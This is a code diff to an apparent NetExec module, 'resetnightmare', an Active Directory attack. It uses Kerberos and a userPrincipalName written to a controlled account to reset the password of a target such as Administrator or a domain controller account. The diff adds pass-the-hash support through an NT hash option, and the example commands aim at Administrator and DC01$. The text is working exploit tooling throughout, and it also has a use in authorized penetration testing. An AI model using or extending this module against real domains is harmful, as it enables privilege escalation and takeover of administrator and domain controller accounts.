@@ -1,4 +1,3 @@
-import sys
 from impacket.krb5 import constants
 from impacket.krb5.types import Principal
 from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError
@@ -26,6 +25,7 @@ class NXCModule:
         self.new_password = None
         self.upn_user = None
         self.upn_password = None
+        self.upn_nthash = None
 
     def options(self, context, module_options):
         """
@@ -36,19 +36,22 @@ class NXCModule:
         NEW_PASSWORD    New password to set on TARGET
         UPN_USER        sAMAccountName of a controlled account you can write a userPrincipalName to (not the login account)
         UPN_PASSWORD    Cleartext password of UPN_USER
+        UPN_NTHASH      NT Hash of UPN_USER
 
         Examples:
         netexec ldap <ip> -u <username> -p <password> -M resetnightmare -o TARGET=Administrator NEW_PASSWORD='NewPass!' UPN_USER=controlled UPN_PASSWORD='Passw0rd!'
+        netexec ldap <ip> -u <username> -p <password> -M resetnightmare -o TARGET=Administrator NEW_PASSWORD='NewPass!' UPN_USER=controlled UPN_NTHASH='31d6cfe0d16ae931b73c59d7e0c089c0'
         netexec ldap <ip> -u <username> -p <password> -M resetnightmare -o TARGET=DC01$ NEW_PASSWORD='NewPass!' UPN_USER=controlled$ UPN_PASSWORD='Passw0rd!'
         """
         self.target = module_options.get("TARGET")
         self.new_password = module_options.get("NEW_PASSWORD")
         self.upn_user = module_options.get("UPN_USER")
-        self.upn_password = module_options.get("UPN_PASSWORD")
+        self.upn_password = module_options.get("UPN_PASSWORD", "")
+        self.upn_nthash = module_options.get("UPN_NTHASH", "")
 
-        if not all([self.target, self.new_password, self.upn_user, self.upn_password]):
-            context.log.fail("TARGET, NEW_PASSWORD, UPN_USER and UPN_PASSWORD are all required")
-            sys.exit(1)
+        if not all([self.target, self.new_password, self.upn_user, self.upn_password or self.upn_nthash]):
+            context.log.fail("TARGET, NEW_PASSWORD, UPN_USER and either UPN_PASSWORD or UPN_NTHASH are all required")
+            return False
 
     def resolve_account(self, sam):
         response = self.connection.search(searchFilter=f"(sAMAccountName={sam})", attributes=["distinguishedName"])
@@ -85,7 +88,7 @@ class NXCModule:
         client = Principal(self.target, type=constants.PrincipalNameType.NT_ENTERPRISE.value)
         kdc = self.connection.kdcHost or self.connection.host
         try:
-            tgt, cipher, _, session_key = getKerberosTGT(client, self.upn_password, self.connection.domain, "", "", "", kdcHost=kdc, serverName=KRB5_KPASSWD_TGT_SPN)
+            tgt, cipher, _, session_key = getKerberosTGT(client, self.upn_password, self.connection.domain, "", self.upn_nthash, "", kdcHost=kdc, serverName=KRB5_KPASSWD_TGT_SPN)
         except (KerberosError, OSError) as e:
             self.context.log.fail(f"Failed to request change-password TGT: {e}")
             return None
